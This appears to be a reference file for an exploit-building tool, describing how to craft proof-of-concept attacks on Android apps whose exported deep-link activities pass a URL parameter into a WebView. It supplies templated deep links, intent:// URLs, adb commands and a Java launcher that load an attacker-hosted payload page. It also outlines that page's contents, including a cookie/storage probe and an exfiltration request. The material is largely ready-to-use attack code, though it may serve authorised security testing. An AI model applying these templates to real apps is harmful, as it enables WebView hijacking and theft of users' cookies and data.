---
name: poc-app-webview
description: WebView PoC reference for deep-link to WebView sink URL-parameter injection.
---

# WebView PoC Reference

For the common case where an exported `VIEW`/`BROWSABLE` activity accepts a deep link, one query parameter is forwarded into `WebView.loadUrl(...)`, and the attacker only needs to control the target URL.

This is the main server-side pattern for `decx-poc`.

## Construction Goal

Build three forms for the same target:

1. raw deep link
2. browser-friendly `intent://` URL
3. equivalent `adb shell am start` command

## Deep Link Pattern

```text
TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html
```

`TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=` is the victim deep-link prefix; `payload.html` is the attacker-controlled page served by the local PoC server.

## intent:// Pattern

```text
intent://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html#Intent;scheme=TARGET_SCHEME;package=TARGET_PACKAGE;component=TARGET_PACKAGE/.DeepLinkActivity;end
```

## ADB Pattern

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html"
```

Explicit launch:

```bash
adb shell am start -n TARGET_PACKAGE/.DeepLinkActivity \
  -a android.intent.action.VIEW \
  -d "TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html"
```

## Android-Side Launch Body

```java
private static void runWebViewDeepLink(Context context) {
    Intent intent = new Intent(Intent.ACTION_VIEW);
    intent.setData(Uri.parse("TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html"));
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
    Log.i("PoC", "Launched deep link into victim WebView sink");
}
```

## Hosted Payload Rule

`payload.html` stays minimal. Normal changes: one bridge call, one cookie/storage probe, one `intent://` redirect, one exfiltration request. Add one script block per active PoC and remove anything the target does not need.
